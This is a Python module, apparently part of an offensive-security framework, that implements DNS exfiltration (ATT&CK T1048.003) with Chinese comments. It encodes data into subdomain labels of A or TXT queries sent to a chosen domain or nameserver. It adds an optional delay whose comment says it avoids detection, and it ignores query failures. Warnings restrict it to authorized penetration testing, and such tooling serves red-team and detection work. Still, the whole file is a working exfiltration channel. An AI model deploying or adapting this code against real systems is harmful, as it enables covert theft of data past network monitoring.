#!/usr/bin/env python3
"""
DNS 外泄通道 - DNS Exfiltration Channel
ATT&CK Technique: T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol

通过 DNS 查询进行数据外泄
仅用于授权渗透测试和安全研究

Warning: 仅限授权渗透测试使用！
"""

from typing import Iterable
import logging
import base64
import time
import ipaddress

from ..base import (
    BaseExfiltration,
    ExfilConfig,
    ExfilChannel,
)

logger = logging.getLogger(__name__)


class DNSExfiltration(BaseExfiltration):
    """
    DNS 外泄通道

    通过 DNS 查询（子域名）编码数据进行外泄

    数据编码到子域名中：
    <encoded_data>.<chunk_id>.<transfer_id>.<domain>

    Warning: 仅限授权渗透测试使用！
    """

    name = 'dns_exfil'
    description = 'DNS Exfiltration Channel'
    channel = ExfilChannel.DNS

    # DNS 标签最大长度
    MAX_LABEL_LENGTH = 63
    # DNS 名称最大长度
    MAX_NAME_LENGTH = 253
    # 使用的编码字符集（DNS 安全）
    DNS_SAFE_CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789'

    def __init__(self, config: ExfilConfig):
        super().__init__(config)
        self._resolver = None
        self._transfer_id = ''
        self._chunk_id = 0
        self._domain = config.dns_domain or ''
        self._nameserver = config.nameserver
        self._record_type = 'A'

    def connect(self) -> bool:
        """初始化 DNS 解析器"""
        try:
            import dns.resolver

            self._resolver = dns.resolver.Resolver()

            # 分离 nameserver / domain
            if self.config.destination:
                if self._is_ip(self.config.destination):
                    self._nameserver = self._nameserver or self.config.destination
                elif not self._domain:
                    self._domain = self.config.destination

            if self._nameserver:
                if self._is_ip(self._nameserver):
                    self._resolver.nameservers = [self._nameserver]
                else:
                    self.logger.warning(f"无效的 nameserver (需 IP): {self._nameserver}")

            if not self._domain:
                self.logger.error("DNS 外泄缺少域名: 请设置 dns_domain 或 destination(域名)")
                return False

            # 生成传输 ID
            import uuid
            self._transfer_id = str(uuid.uuid4())[:8].lower()
            self._chunk_id = 0

            return True

        except ImportError:
            self.logger.error("dnspython library not available")
            return False
        except Exception as e:
            self.logger.error(f"DNS resolver setup failed: {e}")
            return False

    def disconnect(self) -> None:
        """清理"""
        self._resolver = None

    def send_chunk(self, data: bytes) -> bool:
        """
        通过 DNS 查询发送数据块

        Args:
            data: 数据块

        Returns:
            是否成功
        """
        if not self._resolver or not self._domain:
            return False

        try:
            encoded = self._encode_payload(data)
            if not encoded:
                return False

            sent_any = False
            for seq, chunk in self._split_encoded(encoded):
                query_name = self._build_query_name(chunk, seq)
                if len(query_name) > self.MAX_NAME_LENGTH:
                    self.logger.error(f"Query name too long: {len(query_name)}")
                    return False

                self._send_query(query_name)
                sent_any = True

                # 小延迟避免被检测
                if self.config.stealth:
                    time.sleep(0.1)

            if sent_any:
                self._chunk_id += 1
            return sent_any

        except Exception as e:
            self.logger.error(f"DNS exfil failed: {e}")
            return False

    def _encode_payload(self, data: bytes) -> str:
        """将数据编码为 DNS 安全格式 (base32)"""
        encoded = base64.b32encode(data).decode('ascii').lower()
        return encoded.rstrip('=')

    def _split_encoded(self, encoded: str) -> Iterable[tuple[int, str]]:
        """根据 DNS 名称长度限制切分编码字符串"""
        offset = 0
        seq = 0
        while offset < len(encoded):
            max_len = self._max_label_len(seq)
            if max_len <= 0:
                self.logger.error("DNS 名称过长，无法切分有效标签")
                return
            chunk = encoded[offset: offset + max_len]
            yield seq, chunk
            offset += max_len
            seq += 1

    def _build_query_name(self, data_chunk: str, seq: int) -> str:
        """构建 DNS 查询名"""
        return f"{data_chunk}.{seq}.{self._chunk_id}.{self._transfer_id}.{self._domain}"

    def _max_label_len(self, seq: int) -> int:
        max_label = min(self.config.dns_subdomain_length, self.MAX_LABEL_LENGTH)
        suffix = f".{seq}.{self._chunk_id}.{self._transfer_id}.{self._domain}"
        remaining = self.MAX_NAME_LENGTH - len(suffix)
        return min(max_label, max(0, remaining))

    def _send_query(self, query_name: str) -> None:
        try:
            self._resolver.resolve(query_name, self._record_type)
        except (OSError, ConnectionError, TimeoutError):
            # DNS 查询可能失败（NXDOMAIN、超时），但数据已通过查询发送
            pass

    @staticmethod
    def _is_ip(value: str) -> bool:
        try:
            ipaddress.ip_address(value)
            return True
        except ValueError:
            return False


class DNSExfiltrationTXT(DNSExfiltration):
    """
    DNS TXT 记录外泄

    使用 TXT 记录查询进行数据外泄
    数据被编码到查询名称的子域名中

    Warning: 仅限授权渗透测试使用！
    """

    name = 'dns_txt_exfil'
    description = 'DNS TXT Record Exfiltration Channel'
    def __init__(self, config: ExfilConfig):
        super().__init__(config)
        self._record_type = 'TXT'

    def _encode_payload(self, data: bytes) -> str:
        """TXT 记录使用 base64url 编码"""
        encoded = base64.urlsafe_b64encode(data).decode('ascii')
        return encoded.rstrip('=')


__all__ = ['DNSExfiltration', 'DNSExfiltrationTXT']
